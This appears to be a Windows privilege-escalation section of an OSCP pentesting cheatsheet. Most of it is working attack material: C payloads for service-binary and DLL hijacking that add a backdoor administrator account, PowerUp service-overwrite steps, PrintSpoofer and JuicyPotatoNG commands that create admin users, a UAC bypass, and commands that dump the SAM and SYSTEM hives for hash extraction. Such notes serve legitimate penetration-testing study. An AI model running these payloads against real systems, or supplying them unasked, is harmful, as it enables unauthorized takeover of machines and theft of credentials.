## Basic Commands
---

```powershell
whoami
whoami /groups
whoami /priv

$env:path
dir env:
dir /a:h

systeminfo
ipconfig /all
route print
netstat -ano
net user username

powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember group
Get-LocalGroupMember administrators

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Also check in Program Files and Downloads

Get-Process
Get-Process | Select ProcessName,Path

Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include proof.txt, local.txt -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\username\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-History
```

## Tools
---
- [Seatbelt](https://github.com/GhostPack/Seatbelt.git) 
- [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) 

If the result for Windows doesn't display colors, add this REG value

```powershell
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 
```

## Enumeration
---

[](https://github.com/BlessedRebuS/OSCP-Pentesting-Cheatsheet/blob/main/README.md#enumeration-1)

As always, enumerate all the possible things, login to SMB/SSH/Other services with default userames ad passwords or perform a _null login_ as the following

For rpcclient:

```shell
rpcclient -U "" <target>
```

For for smbclient:

```shell
smbclient -L <target> -U ""
```

## Service Binary Hijacking
---
### PowerUp

To enable the powershell scripting capability:

```powershell
powershell -ep bypass
```

Then we enable PowerUp:

```powershell
. .\PowerUp.ps1
```

To list modifiable services:

```powershell
Get-ModifiableServiceFile
```

Once we spot an interesting service, we can try to abuse it with:

```powershell
Install-ServiceBinary -Name '<SERVICENAME>'
```

If we have to manually load a custom exploit into the service we can directly write the C code and compile it for our needs:

```c
#include <stdlib.h>

int main ()
{
  int payload;
  
  payload = system ("net user john Password123! /add");
  payload = system ("net localgroup administrators john /add");
  
  return 0;
}
```

And then compile it with:

```shell
x86_64-w64-mingw32-gcc payload.c -o payload.exe
```

## Service DLL Hijacking
---

This is the order Windows search for DLLs:

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

The following C program can be used to exploit a missing DLL:

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int payload;
        payload = system ("net user john Password123! /add");
        payload = system ("net localgroup administrators john /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

We will then compile it on the linux machine with the `--shared` option and we load it in the Windows machine **in the path and with the name that Windows expect the DLL to have**. Obviously this works only if we have the **WRITE** permission on that files.

```shell
x86_64-w64-mingw32-gcc calledDll.cpp --shared -o calledDll.dll
```

Trasnfer the file and restart the service with:

```powershell
Restart-Service <SERVICENAME>
```

And we will be able to execute a shell as admin with the user john. We could not be able to log-in via RDP because the user may not be in the RDP group.

## Unquoted Service Paths
---

We find unquoted paths with the command:

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

We must check if we have write permissions on the executable in order to replace it with a new one:

```powershell
icacls "C:\Program Files\Enterprise Apps\path\to\service.exe"
```

Then if we have permission on the service we can start or stop it with `Start-Service` or `Stop-Service` command. Once we got the paths we can use PowerUp.ps1 for exploting the service. This means the service will be replaced with a malicious exe.

```powershell
Get-UnquotedService
powershell -ep bypass
. .\PowerUp.ps1
```

And finally we run the command to overwrite the service with

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

Now restarting the service will grant us an Administrator account with user john and Password123! as credentials:

```powershell
Restart-Service GammaService
```

## Scheduled Tasks
---

If a task is executed periodically, we can exploit the called program if we have write permissions on it. To seek for scheduled tasks we can run.

```powershell
schtasks /query /fo LIST /v
```

Eventually we can use `findstr` if we want to search for something specific. After that we can replace the program with a simple .exe that creates a new admin user.

## Windows Services
---

We can watch status of Windows services with [Watch-Command](https://github.com/markwragg/PowerShell-Watch/tree/master)

## Exploits
---

We can use multiple exploits for Windows, depending on the privileges we got on the system. An example could be [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). We could serve it on the victim machine. If we have `SeImpersonatePrivilege` privilege displayable with `whoami /priv` we could gain Admin privileges with

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```

If we have `SeImpersonatePrivilege` we can use also Juicy-Potato to create an admin user (hacker:P@ssw0rd) on the system:
- https://pentest.party/notes/windows/privilege-impersonate
- https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1

There is a wide range of this exploits. We can use the whole [Potato Family](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) and perform a Privilege Escalation. A real-life scenario of a Windows privilege escaltion could be exploiting the [`SeBackupPrivilege`](https://juggernaut-sec.com/sebackupprivilege).

```powershell
.\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "/c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

.\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "net localgroup administrators user /add"
```

## Extracting a Copy of the SAM and SYSTEM Files Using reg.exe
---

After having gained the Administrator access we cam dump SAM and SYSTEM using reg.exe:

```powershell
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
```

Once copied back on the Kali machine the two files we can dump them with

```shell
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

or

```shell
samdump2 SYSTEM SAM
```

This will give us a list of userame:hash that can be cracked using hashcat's NTLM cracking or used for a Pass The Hash attack. Other ways to perform a SAM and SYSTEM credential dumping are explained [here](https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/). Many scenarios about dumping SAM ad SYSTEM can be found [here](https://www.hackingarticles.in/credential-dumping-sam/).

## UAC Bypass
---

Due to unsafe .Net Deserialization we can exploit the system using [UAC Bypass](https://github.com/CsEnox/EventViewer-UACBypass).

```powershell
PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1

PS C:\Windows\Tasks> Invoke-EventViewer 
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe

PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
[+] Running
[1] Crafting Payload
[2] Writing Payload
[+] EventViewer Folder exists
[3] Finally, invoking eventvwr
```

### Additional Tips for Windows PE

Always check installed programs under `C:\Program Files(x86)` or under folders as `Downloads` or `Documents`. We can find exploitable programs (search the program name with searchsploit) or interesting files like Keypass vaults or hashed credentials to be cracked. Additioally, if we find some non-standard executable program that requires some sort of credentials for it, just do a `strings fileame.exe` because the credentials may be hardcoded into it.